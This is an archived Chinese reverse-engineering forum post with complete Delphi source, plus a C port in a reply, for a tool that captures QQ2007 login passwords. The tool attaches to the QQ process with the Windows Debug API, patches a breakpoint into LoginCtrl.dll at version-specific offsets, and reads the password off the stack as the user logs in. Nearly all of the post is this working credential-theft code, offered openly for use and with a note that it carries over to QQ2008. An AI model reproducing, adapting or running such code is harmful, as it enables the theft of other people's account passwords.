

# 利用 Debug Api 获得 QQ2007 密码

> 原文：[`www.pediy.com/kssd/pediy10/60623.html`](https://www.pediy.com/kssd/pediy10/60623.html)

随手写写的代码.这是上年的代码.2008 版同样可以在 ESP+24 读取密码.只不过下断位置不同罢了.  
  
{\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*}  
{                                                       }  
{       利用 Debug Api 获得 QQ2007 密码                    }  
{   只支持 QQ2007 版本为 7.1.576.1763 或 7.0.431.1723        }  
{       版权所有 (C) 2008 Open\[x.g.c\]                   }  
{                                                       }  
{\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*}  
  
unit Unit1;  
  
interface  
  
uses  
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,  
  Dialogs, StdCtrls, ComCtrls,psapi,StrUtils;  
  
type  
  TForm1 = class(TForm)  
    Button1: TButton;  
    Label1: TLabel;  
    procedure Button1Click(Sender: TObject);  
  private  
    { Private declarations }  
  public  
    { Public declarations }  
  end;  
  
var  
  Form1: TForm1;  
const  
    Code :DWORD = $CC;  
    JCode :DWORD =$8D;  
implementation  
  
{$R \*.dfm}  
var  
  ProcessID: DWORD;  
  
function HexToInt(HexStr: string): Int64;  
var  
  RetVar: Int64;  
  i: byte;  
begin  
  HexStr := UpperCase(HexStr);  
  if HexStr\[length(HexStr)\] = 'H' then  
    Delete(HexStr, length(HexStr), 1);  
  RetVar := 0;  
  for i := 1 to length(HexStr) do begin  
    RetVar := RetVar shl 4;  
    if HexStr\[i\] in \['0'..'9'\] then  
      RetVar := RetVar + (byte(HexStr\[i\]) - 48)  
    else  
      if HexStr\[i\] in \['A'..'F'\] then  
        RetVar := RetVar + (byte(HexStr\[i\]) - 55)  
      else begin  
        Retvar := 0;  
        break;  
      end;  
  end;  
  Result := RetVar;  
end;  
  
  
function GetMem(nOK  :THANDLE;Addr:DWORD;len:integer=0):string;  
const FindCount=100;  
var  
    buf1:array\[0..FindCount\] of pchar ;  
    OK  :BOOL;  
    nSize: DWORD;  
    lpNumberOfBytesRead:cardinal;  
    res,tmp:string;  
    s:array\[0..FindCount\] of string;  
    i:integer;  
begin  
  if len<>0 then begin  
    nSize:=len ;  
    buf1\[0\]:=AllocMem(nSize);  
    OK :=ReadProcessMemory(nOK,Pointer(addr),buf1\[0\],nSize,lpNumberOfBytesRead);  
    if(OK or (nSize<>lpNumberOfBytesRead)) then begin  
      s\[0\]:='';  
      for i :=0  to nSize-1 do  begin  
        s\[0\] := s\[0\] + format('%.2X',\[ord(buf1\[0\]\[i\])\]);  
      end;  
    end;  
    FreeMem(buf1\[0\], nSize);  
    tmp:=s\[0\];  
    i:=1;  
    res:='';  
    while i<length(tmp) do begin  
      res:=res+chr(HexToInt(copy(tmp,i,2)));  
      inc(i,2);  
    end;  
    result:=res;  
    exit;  
  end;  
end;  
  
  
  
procedure NewProcess;  
  var  
      I: Integer;  
      Count: DWORD;  
      ModHandles: array\[0..$3FFF - 1\] of DWORD;  
      ModInfo: TModuleInfo;  
      ModName: array\[0..MAX\_PATH\] of char;  
      Num : Cardinal;  
      Rc,ok :Boolean;  
      DebugD: DEBUG\_EVENT;  
      Context: \_CONTEXT;  
      base: Pointer;  
      ProcHand : THandle;  
      ThreadHandle :THandle;  
      EAX : string;  
begin  
      ProcHand := OpenProcess(PROCESS\_ALL\_ACCESS,False,ProcessID);  
      if ProcHand <> 0 then  
   try  
      EnumProcessModules(ProcHand,@ModHandles,SizeOf(ModHandles),Count);  
          for I :=0 to (Count div SizeOf(DWORD)) - 1 do  
              if (GetModuleFileNameEx(ProcHand,ModHandles\[I\],ModName,SizeOf(ModName)) > 0) and GetModuleInformation(ProcHand,  
                  ModHandles\[I\],@ModInfo,SizeOf(ModInfo)) and (RightStr(UpperCase(ModName),13)= 'LOGINCTRL.DLL') then  
                   begin  
                     if  DWord(ModInfo.EntryPoint) - Dword(ModInfo.lpBaseOfDll) = $22C3A then  
                     base :=  Pointer(DWord(ModInfo.lpBaseOfDll)+$15C90);  
                     if  DWord(ModInfo.EntryPoint) - Dword(ModInfo.lpBaseOfDll) = $2043A then  
                     base :=  Pointer(DWord(ModInfo.lpBaseOfDll)+$148A3);  
                     ok := WriteProcessMemory(ProcHand,base,@Code,1,Num);  
                     if not ok then Exit;  
                     if  not DebugActiveProcess(ProcessID) then  Exit;  
                     Rc := True;  
     while WaitForDebugEvent(DebugD, INFINITE) do  
       begin  
         case DebugD.dwDebugEventCode of  
            EXIT\_PROCESS\_DEBUG\_EVENT:  
         begin  
            Form1.Label1.Caption := '被调试进程中止';  
            Break;  
           end;  
            CREATE\_PROCESS\_DEBUG\_EVENT:  
         begin  
            ThreadHandle := DebugD.CreateProcessInfo.hThread;  
            Form1.Label1.Caption := '请输入密码点登录';  
          end;  
             EXCEPTION\_DEBUG\_EVENT:  
         begin  
           case DebugD.Exception.ExceptionRecord.ExceptionCode of  
             EXCEPTION\_BREAKPOINT:  
      begin  
         if  base = DebugD.Exception.ExceptionRecord.ExceptionAddress then  
         begin  
           Context.ContextFlags := CONTEXT\_FULL;  
           GetThreadContext(ThreadHandle, Context);  
           EAX := Trim(GetMem(ProcHand,Context.Esp + $24,20));  
           Form1.Label1.Caption := 'QQ 密码:' + EAX  ;  
           Rc := WriteProcessMemory(ProcHand,Pointer(dword(base)),@JCode,1,Num);  
           Context.Eip := dword(base);  
           SetThreadContext(ThreadHandle, Context);  
        end;  
      end;  
   end;  
       end;  
      end;  
    if Rc then  
      ContinueDebugEvent(DebugD.dwProcessId, DebugD.dwThreadId,DBG\_CONTINUE)  
    else  
      ContinueDebugEvent(DebugD.dwProcessId, DebugD.dwThreadId, DBG\_EXCEPTION\_NOT\_HANDLED);  
    end;  
      CloseHandle(ThreadHandle);  
  end;  
      finally  
          CloseHandle(ProcHand);  
      end;  
  end;  
  
  
procedure TForm1.Button1Click(Sender: TObject);  
var  
  h: HWND;  
  ThreadID: THandle;  
begin  
  h := FindWindow(nil,'QQ 用户登录');  
  if h = 0 then  
 begin  
  Form1.Label1.Caption := '没有找到 QQ 登录框'  ;  
  Exit;  
 end;  
  GetWindowThreadProcessId(h,ProcessID) ;  
  CreateThread(nil, 0, @NewProcess, nil, 0, ThreadID) ;  
end;  
  
end. 

参照楼主代码，改写成了 C 语言版，以方便像我一样看 DELPHI 晕的人。代码写的不好，大家见笑了。  
  

代码:

```
  HWND hWnd      = NULL;
  HANDLE QQhandle    = NULL;
  HANDLE threadHandle = NULL;

  HMODULE modArr\[1024\]  = {0};
  MODULEINFO modInfo    = {0};
  char modName\[MAX\_PATH\]  = {0};
  char password\[100\]    ={0};
  
  DWORD dwPid    = 0;
  DWORD dwNumMod  = 0;
  DWORD dwWriten  = 0;
  DWORD code    = 0xCC;
  DWORD oriCode  = 0x8D;

  BOOL bContinue  = FALSE;
  LPVOID base    = NULL;
  DEBUG\_EVENT dEvnt = {0}; 
  CONTEXT thContext = {0};
  CString strPass;
  
  hWnd = ::FindWindow(NULL,"QQ 用户登录");
  if(!hWnd)
  {
    AfxMessageBox("未找到 QQ 用户登录窗口！");
    return 0;
  }
  
  GetWindowThreadProcessId(hWnd,&dwPid);
  
  QQhandle = OpenProcess(PROCESS\_ALL\_ACCESS,FALSE,dwPid);
  if(!QQhandle)
  {
    AfxMessageBox("不能打开 QQ 进程！");
    return 0;
  }

  if(!EnumProcessModules(QQhandle,modArr,sizeof(modArr),&dwNumMod))
  {
    AfxMessageBox("枚举 QQ 进程模块失败！");
    return 0;
  }

  for(DWORD i=0;i<dwNumMod/(sizeof(DWORD)-1);i++)
  {
    if(GetModuleFileNameEx(QQhandle,modArr\[i\],modName,sizeof(modName))>0 && 
      GetModuleInformation(QQhandle,modArr\[i\],&modInfo,sizeof(modInfo)) &&
      \_stricmp(modName+strlen(modName)-13,"loginctrl.dll") == 0)
    {
      if(((DWORD)modInfo.EntryPoint - (DWORD)modInfo.lpBaseOfDll) == 0x22C3A)
        base = (LPVOID)((DWORD)modInfo.lpBaseOfDll+0x15C90);

      if(((DWORD)modInfo.EntryPoint - (DWORD)modInfo.lpBaseOfDll) == 0x2043A)
        base = (LPVOID)((DWORD)modInfo.lpBaseOfDll+0x148A3);

      if(!WriteProcessMemory(QQhandle,base,&code,1,&dwWriten))
      {
        AfxMessageBox("写入 QQ 进程失败！");
        return 0;
      }

      if(!DebugActiveProcess(dwPid))
      {
        AfxMessageBox("Debug QQ 进程失败！");
        return 0;
      }

      bContinue = TRUE;

      while(WaitForDebugEvent(&dEvnt,INFINITE))
      {
        switch(dEvnt.dwDebugEventCode)
        {
          case EXIT\_PROCESS\_DEBUG\_EVENT:
            AfxMessageBox("进程退出！");
            break;
          case CREATE\_PROCESS\_DEBUG\_EVENT:
            threadHandle = dEvnt.u.CreateProcessInfo.hThread;
            AfxMessageBox("请输入密码点登录!");
            break;
          case EXCEPTION\_DEBUG\_EVENT:
            switch(dEvnt.u.Exception.ExceptionRecord.ExceptionCode)
            {
              case EXCEPTION\_BREAKPOINT:
                if(dEvnt.u.Exception.ExceptionRecord.ExceptionAddress == base)
                {
                  thContext.ContextFlags = CONTEXT\_FULL;
                  GetThreadContext(threadHandle,&thContext);

                  memset(password,0,sizeof(password));
                  ReadProcessMemory(QQhandle,(LPVOID)(thContext.Esp+0x24),password,sizeof(password),&dwWriten);

                  strPass.Format("QQ 密码:%s",password);
                  AfxMessageBox(strPass);

                  WriteProcessMemory(QQhandle,base,&oriCode,1,&dwWriten);
                  thContext.Eip = (DWORD)base;
                  SetThreadContext(threadHandle,&thContext);

                  break;
                }
            }
        }
        if(bContinue)      
          ContinueDebugEvent(dEvnt.dwProcessId,dEvnt.dwThreadId,DBG\_CONTINUE);
        else
          ContinueDebugEvent(dEvnt.dwProcessId,dEvnt.dwThreadId,DBG\_EXCEPTION\_NOT\_HANDLED);
      }      

      CloseHandle(QQhandle);
      CloseHandle(threadHandle);

      break;
    }
  }

```